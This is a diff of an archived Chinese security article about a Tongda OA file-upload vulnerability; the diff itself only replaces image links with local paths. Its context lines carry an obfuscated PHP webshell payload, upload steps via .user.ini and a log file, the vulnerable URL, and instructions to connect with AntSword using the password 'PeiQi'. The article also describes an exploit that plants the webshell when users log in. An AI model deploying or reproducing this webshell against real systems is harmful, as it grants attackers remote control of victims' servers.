@@ -48,7 +48,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5TxJ_4rEPvMyjU3KVflkbQ)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)
+![](../../.resource/remote/565dff06de2c0571aa8634353d3ee48f34e22060ed81ae34dbacca97a9237278.gif)
 
 **一****：漏洞描述🐑**
 
@@ -72,7 +72,7 @@ echo "PeiQi_Wiki";
 $fOgT=create_function(base64_decode('JA==').chr(114195/993).str_rot13('b').str_rot13('z').chr(708-607),chr(0xc60e/0x1f6).base64_decode('dg==').str_rot13('n').chr(390-282).chr(0x1ae-0x186).chr(0x3ac-0x388).chr(0xd561/0x1db).base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ==').str_rot13(')').chr(798-739));$fOgT(base64_decode('OTM2N'.'DM3O0'.'BldkF'.'sKCRf'.''.str_rot13('H').str_rot13('R').chr(41382/726).str_rot13('G').base64_decode('Vg==').''.''.base64_decode('Rg==').str_rot13('g').str_rot13('D').base64_decode('Wg==').chr(23751/273).''.'lRaV0'.'pOzI4'.'MDkzM'.'TE7'.''));?>
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXBQiaLY6vMhiaOC5NWayXOR9P0xqmgqUpVdgvOMuCUOiaKJnfpZUnic226Q/640?wx_fmt=png)
+![](../../.resource/remote/576381110e707e54923c47efe769c7fa8d753a780d68623d1870e920f429e0a5.png)
 
 **上传 .user.ini 再上传 peiqi.log 后访问 URL 出现 PeiQi_Wiki 就是成功上传了**
 
@@ -80,23 +80,23 @@ $fOgT=create_function(base64_decode('JA==').chr(114195/993).str_rot13('b').str_r
 http://192.168.1.103/general/reportshop/workshop/report/attachment-remark/form.inc.php?
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXhl9DMrFdbmu7Ib2naUic4fMuN6Xp5IZ7uxt1TibD28eicN88617viaAYyA/640?wx_fmt=png)
+![](../../.resource/remote/1e16c78e5cf5c68516e61f6a2e8b1970e2e82ad6d25cefacd5269a64b173eaa9.png)
 
 使用蚁剑连接 密码为 PeiQi (Url 访问无需登录，可直接远程连接)  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXC1IuSsBuLqPfyEtsVdicZsG8EP6XaibmWLBJ9oVJxWFgDYQ4vu7P0bEQ/640?wx_fmt=png)
+![](../../.resource/remote/8305266453715ec01abf7a2c9cbc66933d5688abe74c7d46f300b3b28885c60b.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXKIWJukHdWibtW7jSibrUkP6mGhWahVjKTicBGTSrhiazg44aNBbqKExNJg/640?wx_fmt=png)
+![](../../.resource/remote/22662574003532e310eac297e5f43ba0a65ddb13abbc06716b2303d74717f573.png)
 
 **这里重新写了一个 EXP，为蚁剑 Webshell 上传 EXP（文末获取）**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXiae4RiaeNGdP3X7PjVfjFXibs1QF103Y131c76J9PxmEnGqz1vn7SyPvQ/640?wx_fmt=png)
+![](../../.resource/remote/867c1e8950866d892f12c9f1df2172c357520fb4566bd8366f99d46d2f914b50.png)
 
 **配合 之前的通达 OA v11.7 以下的在线用户 Cookie 泄露**
 
 **一旦用户登录 OA 系统时就主动上传 Webshell**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXarSzexOYwe2nZ7lZUBC8IZibhHlsUYXfDcIwJL9cnQs6jpjfXxC75bg/640?wx_fmt=png)
+![](../../.resource/remote/acf462764edde3221119fc5a4e7fd5ce98f7496789065dccbee6d0ff94130a2f.png)
 
 ****四:  漏洞 POC🦉****
 
@@ -105,7 +105,7 @@ https://github.com/PeiQi0/PeiQi-WIKI-POC
 目前POC已经全部上传到Github
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5C7gt4ujDhv38rezvU0QIXH5Dc2zLKmekCoib4e1nNDiczwo1pfqicy7tdxfkCsJM9kmPQgTF6tP41Q/640?wx_fmt=png)
+![](../../.resource/remote/a8e1ed8e7c464e816fcb45afd8187f7d1db40413c5ee2e3d2a1726e4d99d40e8.png)
 
 **蚁剑后台文件上传  
 **
@@ -340,7 +340,7 @@ if __name__ == '__main__':
 > 
 > 别忘了 Github 下载完给个小星星⭐
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)
+![](../../.resource/remote/db24e7036c6033b3096cc6bcf3daa42f7778b91d944c595acd55b7a1b0302046.png)
 
 ---
 
